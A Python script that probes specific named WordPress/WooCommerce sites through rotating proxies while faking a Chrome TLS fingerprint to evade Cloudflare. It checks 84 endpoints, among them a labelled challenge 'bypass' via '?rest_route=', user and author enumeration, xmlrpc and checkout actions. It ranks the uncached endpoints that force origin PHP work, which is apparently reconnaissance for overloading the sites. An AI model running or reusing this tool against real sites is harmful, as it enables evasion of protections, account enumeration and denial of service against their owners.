#!/usr/bin/env python3
"""
buffalo_probe.py — comprehensive endpoint probe for metoo-buffalo.com

Probes 84 endpoints via Webshare backbone rotating proxy.
Reports HTTP status, cf-cache-status, response size, and CF challenge state.
Summarises open DYNAMIC, open MISS, blocked, redirected endpoints.

Usage:
  python3 buffalo_probe.py
  python3 buffalo_probe.py --target metoo-shatkin.com
  buffalo-probe                          # after global install
  buffalo-probe --target metoo-shatkin.com
"""
import os, sys, argparse, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as cffi

INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE  = os.path.join(INSTALL_DIR, "proxies_webshare_backbone_creds.txt")
WS_HOST     = "p.webshare.io"
WS_PORT     = 80
UA          = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
               "AppleWebKit/537.36 (KHTML, like Gecko) "
               "Chrome/124.0.0.0 Safari/537.36")

def load_proxy():
    with open(CREDS_FILE) as f:
        lines = [l.strip() for l in f if l.strip()]
    u, p = lines[0], lines[1]
    proxy = f"http://{u}:{p}@{WS_HOST}:{WS_PORT}"
    return proxy

def build_probes(target):
    P = []
    def G(label, path, method="GET", body=None):
        P.append((label, path, method, body))

    # 1. admin-ajax variants
    G("heartbeat",                   "/wp-admin/admin-ajax.php?action=heartbeat")
    G("ajax_wp_check_locked_post",   "/wp-admin/admin-ajax.php?action=wp-check-locked-post")
    G("ajax_save_post",              "/wp-admin/admin-ajax.php?action=save_post")
    G("ajax_nopriv_send_link",       "/wp-admin/admin-ajax.php?action=generate_recover_password")
    G("ajax_nopriv_lost_password",   "/wp-admin/admin-ajax.php?action=lostpassword")
    G("ajax_nopriv_woo_fragments",   "/wp-admin/admin-ajax.php?action=woocommerce_get_refreshed_fragments")
    G("ajax_nopriv_woo_session",     "/wp-admin/admin-ajax.php?action=woocommerce_add_to_cart")

    # 2. ?rest_route= bypass
    G("rest_root",           "/?rest_route=/")
    G("rest_posts_embed",    "/?rest_route=/wp/v2/posts&_embed=1")
    G("rest_posts_100",      "/?rest_route=/wp/v2/posts&per_page=100")
    G("rest_pages_embed",    "/?rest_route=/wp/v2/pages&_embed=1")
    G("rest_pages_100",      "/?rest_route=/wp/v2/pages&per_page=100")
    G("rest_media_embed",    "/?rest_route=/wp/v2/media&_embed=1")
    G("rest_media_100",      "/?rest_route=/wp/v2/media&per_page=100")
    G("rest_categories_100", "/?rest_route=/wp/v2/categories&per_page=100")
    G("rest_tags_100",       "/?rest_route=/wp/v2/tags&per_page=100")
    G("rest_users",          "/?rest_route=/wp/v2/users")
    G("rest_users_100",      "/?rest_route=/wp/v2/users&per_page=100")
    G("rest_comments_100",   "/?rest_route=/wp/v2/comments&per_page=100")
    G("rest_settings",       "/?rest_route=/wp/v2/settings")
    G("rest_types",          "/?rest_route=/wp/v2/types")
    G("rest_taxonomies",     "/?rest_route=/wp/v2/taxonomies")
    G("rest_search",         "/?rest_route=/wp/v2/search&search=test&per_page=20")
    G("wc_rest_prods",       "/?rest_route=/wc/store/v1/products")
    G("wc_rest_cart",        "/?rest_route=/wc/store/v1/cart")
    G("wc_v3_rest_prods",    "/?rest_route=/wc/v3/products")

    # 3. Direct /wp-json/* (expect Managed Challenge)
    G("wpjson_root",    "/wp-json/")
    G("wpjson_posts",   "/wp-json/wp/v2/posts")
    G("wpjson_cf7",     "/wp-json/contact-form-7/v1/contact-forms/248/feedback")

    # 4. oEmbed
    G("oembed_home",   f"/?oembed=1&url=https%3A%2F%2F{target}%2F&format=json")
    G("oembed_p850",   f"/?oembed=1&url=https%3A%2F%2F{target}%2F%3Fp%3D850&format=json")
    G("oembed_p1",     f"/?oembed=1&url=https%3A%2F%2F{target}%2F%3Fp%3D1&format=json")
    G("oembed_p2",     f"/?oembed=1&url=https%3A%2F%2F{target}%2F%3Fp%3D2&format=json")
    G("oembed_about",  f"/?oembed=1&url=https%3A%2F%2F{target}%2Fabout%2F&format=json")
    G("oembed_xml",    f"/?oembed=1&url=https%3A%2F%2F{target}%2F%3Fp%3D850&format=xml")

    # 5. xmlrpc
    G("xmlrpc_GET",  "/xmlrpc.php")
    G("xmlrpc_POST", "/xmlrpc.php", "POST",
      b"<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>")

    # 6. wp-cron
    G("wpcron",       "/wp-cron.php")
    G("wpcron_doing", "/wp-cron.php?doing_wp_cron=1")

    # 7. WP login
    G("wp_login_GET",  "/wp-login.php")
    G("wp_login_lost", "/wp-login.php?action=lostpassword")
    G("wp_register",   "/wp-login.php?action=register")

    # 8. WooCommerce /?wc-ajax=
    G("wc_fragments",  "/?wc-ajax=get_refreshed_fragments")
    G("wc_coupon",     "/?wc-ajax=apply_coupon")
    G("wc_cart",       "/?wc-ajax=get_cart_contents")
    G("wc_checkout",   "/?wc-ajax=checkout")
    G("wc_update_rev", "/?wc-ajax=update_order_review")
    G("wc_rm_cart",    "/?wc-ajax=remove_cart_item")
    G("wc_shipping",   "/?wc-ajax=update_shipping_method")

    # 9. WooCommerce /wp-json/*
    G("wc_store_root",  "/wp-json/wc/store/v1/")
    G("wc_store_cart",  "/wp-json/wc/store/v1/cart")
    G("wc_store_prods", "/wp-json/wc/store/v1/products")
    G("wc_v3_prods",    "/wp-json/wc/v3/products")

    # 10. Feeds
    G("feed_main",     "/feed/")
    G("feed_comments", "/comments/feed/")
    G("feed_rss",      "/?feed=rss2")
    G("feed_atom",     "/?feed=atom")

    # 11. Sitemaps
    G("sitemap_index",    "/sitemap_index.xml")
    G("sitemap_wp",       "/wp-sitemap.xml")
    G("sitemap_page",     "/page-sitemap.xml")
    G("sitemap_post",     "/post-sitemap.xml")
    G("sitemap_category", "/category-sitemap.xml")
    G("sitemap_robots",   "/robots.txt")

    # 12. Search
    G("search_1", "/?s=test")
    G("search_2", "/?s=contact")
    G("search_3", "/?s=xyz12345random")

    # 13. Author enumeration
    G("author_1",     "/?author=1")
    G("author_2",     "/?author=2")
    G("author_admin", "/author/admin/")

    # 14. Embed
    G("embed_p850",  "/?p=850&embed=true")
    G("embed_about", "/about/?embed=true")

    # 15. Site pages
    G("home",           "/")
    G("p850",           "/?p=850")
    G("about",          "/about/")
    G("contact",        "/contact/")
    G("privacy",        "/privacy-policy-2/")
    G("category_uncat", "/category/uncategorized/")
    G("page2",          "/page/2/")
    G("page3",          "/page/3/")

    # 16. Misc WP paths
    G("wp_admin",       "/wp-admin/")
    G("wp_admin_index", "/wp-admin/index.php")
    G("readme",         "/readme.html")
    G("license",        "/license.txt")
    G("wp_includes",    "/wp-includes/version.php")

    return P

def probe_one(target, proxy, label, path, method, body):
    url = f"https://{target}{path}"
    px  = {"http": proxy, "https": proxy}
    try:
        sess = cffi.Session(impersonate="chrome124")
        sess.proxies = px
        kw = dict(headers={"User-Agent": UA}, timeout=20, allow_redirects=False)
        if method == "POST":
            kw["data"] = body
            kw["headers"]["Content-Type"] = "text/xml"
            r = sess.post(url, **kw)
        else:
            r = sess.get(url, **kw)
        status = r.status_code
        cache  = r.headers.get("cf-cache-status", r.headers.get("x-cache", "—"))
        size   = len(r.content)
        note   = ""
        if status in (301, 302):
            note = f"→ {r.headers.get('location','?')[:60]}"
        elif status == 403 and "cf-mitigated" in r.headers:
            note = "MANAGED_CHALLENGE"
        return (label, path, method, status, cache, size, note)
    except Exception as e:
        return (label, path, method, "ERR", "—", 0, str(e)[:60])

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="metoo-buffalo.com")
    ap.add_argument("--workers", type=int, default=12)
    args = ap.parse_args()

    proxy  = load_proxy()
    probes = build_probes(args.target)

    print(f"\n{'':=<80}")
    print(f"  buffalo-probe — {args.target}")
    print(f"  Proxy: Webshare backbone rotating")
    print(f"  Endpoints: {len(probes)}")
    print(f"{'':=<80}\n")
    print(f"{'Label':<30} {'M':<5} {'Status':<8} {'Cache':<12} {'Size':>8}  Note")
    print(f"{'-'*30} {'-'*5} {'-'*8} {'-'*12} {'-'*8}  {'-'*30}")

    open_dynamic, open_miss, open_other, blocked, redirected, errors = [], [], [], [], [], []

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(probe_one, args.target, proxy, *p): p for p in probes}
        for fut in as_completed(futs):
            label, path, method, status, cache, size, note = fut.result()
            size_s = f"{size/1024:.1f}KB" if isinstance(size, int) and size > 0 else ("ERR" if status == "ERR" else "0B")
            print(f"{label:<30} {method:<5} {str(status):<8} {cache:<12} {size_s:>8}  {note}")
            row = (label, path, method, status, cache, size, note)
            if status == "ERR":                                   errors.append(row)
            elif status in (301, 302):                            redirected.append(row)
            elif str(status) == "403" and "MANAGED" in note:     blocked.append(row)
            elif cache == "DYNAMIC":                              open_dynamic.append(row)
            elif cache == "MISS":                                 open_miss.append(row)
            else:                                                 open_other.append(row)

    print(f"\n{'':=<80}  SUMMARY\n")

    print(f"  OPEN DYNAMIC ({len(open_dynamic)}) — hits origin PHP worker every request:")
    for r in sorted(open_dynamic, key=lambda x: -x[5]):
        print(f"    [{r[2]:<4}] {r[1]:<55} {r[5]/1024:.1f}KB")

    print(f"\n  OPEN MISS ({len(open_miss)}) — CF cache miss, PHP hit per request:")
    for r in sorted(open_miss, key=lambda x: -x[5]):
        print(f"    [{r[2]:<4}] {r[1]:<55} {r[5]/1024:.1f}KB")

    if open_other:
        print(f"\n  OTHER OPEN ({len(open_other)}):")
        for r in open_other:
            print(f"    {r[0]:<30} {r[3]:<6} {r[4]:<12} {r[1]}")

    print(f"\n  BLOCKED / CHALLENGED ({len(blocked)}):")
    for r in blocked:
        print(f"    {r[0]:<30} {r[3]} {r[1]}")

    print(f"\n  REDIRECTED ({len(redirected)}):")
    for r in redirected:
        print(f"    {r[0]:<30} {r[3]} {r[6]}")

    if errors:
        print(f"\n  ERRORS ({len(errors)}):")
        for r in errors:
            print(f"    {r[0]:<30} {r[6]}")

    print(f"\n{'':=<80}\n")

if __name__ == "__main__":
    main()
